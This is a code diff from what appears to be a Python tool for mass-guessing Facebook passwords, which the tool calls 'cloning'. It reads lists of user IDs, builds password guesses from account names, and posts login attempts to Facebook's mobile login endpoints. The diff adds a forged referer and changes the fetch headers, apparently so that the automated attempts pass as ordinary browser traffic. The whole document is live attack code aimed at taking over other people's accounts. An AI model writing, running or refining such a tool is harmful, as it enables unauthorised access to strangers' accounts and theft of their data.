@@ -129,7 +129,7 @@ ugen = []
 def ク克隆():
     sintx_logo()
     E = "/sdcard/"
-    prnt(pnl("[yellow][»] ENTER NAME OF YOUR FILE", width=90, style=_A))
+    prnt(pnl("[yellow][»] ENTER NAME OF YOUR FILE (example: eiff.txt)", width=90, style=_A))
     F = input(f"{green}  [+] /sdcard/:{dark_gray} ")
     G = E + F
     try:
@@ -261,13 +261,13 @@ def sinsAPI_(uid, names, pxss_, tot4l):
                 .replace("first", L)
                 .replace("last", M)
             )
-            header = {
-               'authority': 'mbasic.facebook.com',
+            header = {'authority': 'mbasic.facebook.com',
                "method": "get",
                "scheme": "https",
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
+               'referer': 'https://mbasic.facebook.com/login/device-based/edit-user/?uid=61555031450231&src=0&wtsid=rdr_0ujhQTQwTom1qVpDe&refsrc=deprecated&_rdr',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
@@ -277,11 +277,11 @@ def sinsAPI_(uid, names, pxss_, tot4l):
                'sec-ch-ua-platform-version': '"13.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
-               'sec-fetch-site': 'none',
+               'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': str(PyBookAgents.random_ugen()),
-            }
+}
             I = C.get(
                 f"https://m.facebook.com/login/device-based/password/?uid={A}&flow=login_no_pin&refsrc=deprecated&_rdr"
             )
